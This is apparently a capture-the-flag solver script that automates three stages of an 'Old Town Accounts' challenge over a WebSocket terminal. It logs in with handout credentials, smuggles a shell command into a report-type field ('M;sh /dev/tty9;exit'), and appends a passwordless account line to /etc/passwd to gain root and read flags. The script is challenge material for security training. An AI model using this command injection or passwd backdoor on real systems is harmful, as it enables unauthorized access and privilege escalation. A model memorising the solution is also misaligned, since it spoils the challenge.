#!/usr/bin/env python3
"""Autosolve one Old Town Accounts scoreboard stage using stdlib only."""
import argparse
import base64
import hashlib
import os
from pathlib import Path
import re
import secrets
import socket
import ssl
import struct
import sys
import time
import urllib.parse
import urllib.request

FLAG_RE = re.compile(rb"noco\{[0-9a-f]{32}\}", re.IGNORECASE)


class WebSocket:
    def __init__(self, target, cookie):
        parsed = urllib.parse.urlsplit(target)
        tls = parsed.scheme == "https"
        host = parsed.hostname
        port = parsed.port or (443 if tls else 80)
        path = parsed.path.rstrip("/") + "/ws"
        raw = socket.create_connection((host, port), timeout=15)
        if tls:
            raw = ssl.create_default_context().wrap_socket(raw, server_hostname=host)
        self.sock = raw
        self.sock.settimeout(15)
        self.pending = bytearray()
        key = base64.b64encode(secrets.token_bytes(16)).decode()
        host_header = host if parsed.port is None else f"{host}:{port}"
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            f"Origin: {parsed.scheme}://{host_header}\r\n"
            f"Cookie: {cookie}\r\n\r\n"
        ).encode()
        self.sock.sendall(request)
        response = self._through(b"\r\n\r\n")
        if not response.startswith(b"HTTP/1.1 101"):
            raise RuntimeError(f"websocket upgrade failed: {response[:120]!r}")
        expected = base64.b64encode(hashlib.sha1(
            (key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()
        ).digest())
        if expected.lower() not in response.lower():
            raise RuntimeError("websocket accept key mismatch")

    def _read(self, size):
        while len(self.pending) < size:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("websocket closed")
            self.pending.extend(chunk)
        result = bytes(self.pending[:size])
        del self.pending[:size]
        return result

    def _through(self, marker):
        while marker not in self.pending:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("connection closed")
            self.pending.extend(chunk)
        end = self.pending.index(marker) + len(marker)
        result = bytes(self.pending[:end])
        del self.pending[:end]
        return result

    def _frame(self, opcode, payload):
        mask = secrets.token_bytes(4)
        length = len(payload)
        if length < 126:
            header = bytes((0x80 | opcode, 0x80 | length))
        elif length < 65536:
            header = bytes((0x80 | opcode, 0xFE)) + struct.pack("!H", length)
        else:
            header = bytes((0x80 | opcode, 0xFF)) + struct.pack("!Q", length)
        masked = bytes(value ^ mask[index % 4]
                       for index, value in enumerate(payload))
        self.sock.sendall(header + mask + masked)

    def send(self, text):
        self._frame(0x1, text.encode("latin-1"))

    def _control(self, opcode, payload=b""):
        self._frame(opcode, payload)

    def receive(self):
        while True:
            first, second = self._read(2)
            opcode = first & 0x0F
            length = second & 0x7F
            if length == 126:
                length = struct.unpack("!H", self._read(2))[0]
            elif length == 127:
                length = struct.unpack("!Q", self._read(8))[0]
            mask = self._read(4) if second & 0x80 else None
            payload = self._read(length)
            if mask:
                payload = bytes(value ^ mask[index % 4]
                                for index, value in enumerate(payload))
            if opcode == 0x8:
                raise EOFError("websocket close frame")
            if opcode == 0x9:
                self._control(0xA, payload)
                continue
            if opcode in (0x0, 0x1, 0x2):
                return payload

    def close(self):
        try:
            self._control(0x8)
        except OSError:
            pass
        self.sock.close()


class Terminal:
    def __init__(self, websocket):
        self.websocket = websocket
        self.buffer = bytearray()

    def send(self, text):
        self.websocket.send(text)

    def expect(self, pattern, timeout=30):
        expression = (pattern if hasattr(pattern, "search") else
                      re.compile(pattern, re.IGNORECASE | re.DOTALL))
        deadline = time.monotonic() + timeout
        while True:
            match = expression.search(self.buffer)
            if match:
                consumed = bytes(self.buffer[:match.end()])
                matched = bytes(match.group())
                del self.buffer[:match.end()]
                return consumed, matched
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(f"timed out waiting for {pattern!r}")
            self.websocket.sock.settimeout(min(15, remaining))
            self.buffer.extend(self.websocket.receive())


def handout_check():
    image = Path(__file__).resolve().parents[1] / "handout/old-town-accounts.rk"
    data = image.read_bytes()
    required = (
        b"login role          clerk",
        b"ACCOUNT 0317 OMITTED",
        b"0317      lantern",
        b"/dev/tty9",
    )
    forbidden = (
        b"Technical Bulletin 7",
        b"/usr/clerk/mailbox",
        b"/proprietor",
        b"M;sh /dev/tty9;exit",
        b"owner::256:256::/tmp:",
        b"wgw7NOT7",
        b"samhain",
    )
    if any(item not in data for item in required):
        raise RuntimeError("handout credential evidence is incomplete")
    if any(item in data for item in forbidden):
        raise RuntimeError("handout contains a later-stage secret")
    if re.search(rb"noco\{", data, re.IGNORECASE):
        raise RuntimeError("handout contains a flag literal")
    if hashlib.sha256(data).hexdigest() != (
            "c9c2a5c37e544735ac0eea9c64674257a8c65c44fe829cb10cc6165b6a028fbc"):
        raise RuntimeError("handout hash does not match its published README")


def connect(target):
    request = urllib.request.Request(target.rstrip("/") + "/")
    with urllib.request.urlopen(request, timeout=90) as response:
        cookie = response.headers.get("Set-Cookie", "").split(";", 1)[0]
    if not cookie.startswith("ota_sess="):
        raise RuntimeError("service didn't issue a session cookie")
    websocket = WebSocket(target, cookie)
    return websocket, Terminal(websocket), cookie


def login(terminal):
    terminal.expect(rb"(?:login:|name:)", 45)
    terminal.send("clerk\r")
    terminal.expect(rb"password:", 15)
    terminal.send("lantern\r")
    _, matched = terminal.expect(FLAG_RE, 30)
    primary = matched.decode("ascii").lower()
    terminal.expect(rb"selection:", 15)
    return primary


def escape(terminal):
    terminal.send("2\r")
    terminal.expect(rb"reprint entry no:", 15)
    terminal.send("1041\r")
    terminal.expect(rb"report type \[m\]:", 15)
    terminal.send("M;sh /dev/tty9;exit\r")
    terminal.expect(rb"legacy report processor", 15)
    time.sleep(1)
    terminal.send("cat /usr/clerk/mailbox\r")
    _, matched = terminal.expect(FLAG_RE, 15)
    return matched.decode("ascii").lower()


def escalate(terminal):
    terminal.send("ed /etc/passwd\r")
    terminal.expect(rb"\d+\r", 10)
    terminal.send("$a\r")
    terminal.expect(rb"\$a\r", 10)
    terminal.send("owner::256:256::/tmp:\r")
    terminal.expect(rb"/tmp:\r", 10)
    terminal.send(".\r")
    terminal.expect(rb"\.\r", 10)
    terminal.send("w\r")
    terminal.expect(rb"\d+\r", 10)
    terminal.send("q\r")
    time.sleep(1)
    terminal.send("\x04")
    terminal.expect(rb"selection:", 15)
    terminal.send("6\r")
    terminal.expect(rb"(?:login:|name:)", 20)
    terminal.send("owner\r")
    terminal.expect(rb"# ", 20)
    terminal.send("cat /proprietor\r")
    _, matched = terminal.expect(FLAG_RE, 15)
    return matched.decode("ascii").lower()


def check_reconnect_and_reset(target, cookie):
    websocket = WebSocket(target, cookie)
    try:
        Terminal(websocket).expect(rb"selection:", 15)  # replayed menu tail
    finally:
        websocket.close()

    parsed = urllib.parse.urlsplit(target)
    origin = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, "", "", ""))
    request = urllib.request.Request(
        target.rstrip("/") + "/reset", method="POST",
        headers={"Cookie": cookie, "Origin": origin})
    with urllib.request.urlopen(request, timeout=45) as response:
        if response.read() != b"restarted":
            raise RuntimeError("reset endpoint returned an unexpected response")

    websocket = WebSocket(target, cookie)
    try:
        Terminal(websocket).expect(rb"(?:login:|name:)", 45)
    finally:
        websocket.close()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("stage", choices=("night", "ledger-escape", "proprietor"))
    args = parser.parse_args()
    target = os.environ["TARGET"]
    if args.stage == "night":
        handout_check()
    websocket, terminal, cookie = connect(target)
    try:
        flag = login(terminal)
        if args.stage != "night":
            flag = escape(terminal)
        if args.stage == "proprietor":
            flag = escalate(terminal)
    finally:
        websocket.close()
    if args.stage == "night":
        check_reconnect_and_reset(target, cookie)
    print(flag)


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        print(f"solve failed: {error}", file=sys.stderr)
        raise SystemExit(1)
